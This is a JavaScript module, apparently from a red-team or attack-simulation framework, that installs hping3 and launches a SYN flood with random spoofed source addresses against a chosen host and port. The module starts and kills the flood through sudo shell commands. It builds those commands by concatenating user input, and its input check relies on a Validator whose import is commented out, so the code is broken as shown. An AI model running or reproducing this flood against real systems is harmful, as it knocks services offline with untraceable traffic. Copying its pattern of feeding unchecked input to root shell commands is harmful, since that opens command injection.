'use strict';

const LinuxModule = require('../base/rdhd-mod-base_linux_module');
//const Validator = require('../../lib/rdhd-lib-input_validator');

// moduleCode: debian_hping3_synflood
class DebianHping3SynFlood extends LinuxModule
{
    // ************************************************************
    //  Hping3SynFlood module
    // ************************************************************
    // https://linuxhint.com/hping3/
    //
    // target      :   single IP (a.b.c.d) or FQDN to scan 
    // port        :   target port
    // operation   :   [start/stop]
    // ************************************************************

    constructor(asset, context, session, wsServer, token)
    {
        super(asset, "debian_hping3_synflood", session, wsServer, token);

        //  POST parameters
        // ******************************
        this.target = context.target;
        this.port = context.port;
        this.operation = context.operation;
    }

    configure(whatIf = false)
    {
        let task = "sudo apt update; sudo apt install hping3 -y";

        //  Async execution
        // ******************************
        this.do(task, "cmd_res", false, whatIf);
    }

    run(whatIf = false)
    {
        if (this.validate())
        {
            let task;

            if (this.operation.toUpperCase() == "START")
            {
                task = "sudo /usr/sbin/hping3 " + this.target + " -V -n -S -p " + this.port + " --flood --rand-source";
            } 
            else 
            {
                task = "sudo killall -9 hping3";
            }

            //  Async execution
            // ******************************
            this.do(task, "cmd_res", false, whatIf);
        }
        else
        {
            this.reportAndExit("Invalid input provided");
        }
    }

    validate()
    {
        if (((this.target) && (Validator.validateHost(this.target) || Validator.validateIp(this.target))) && 
            ((this.port) && (Validator.validateTcpUdpPort(this.port))))
        {
            return true;
        }
        return false;
    }
}

module.exports = DebianHping3SynFlood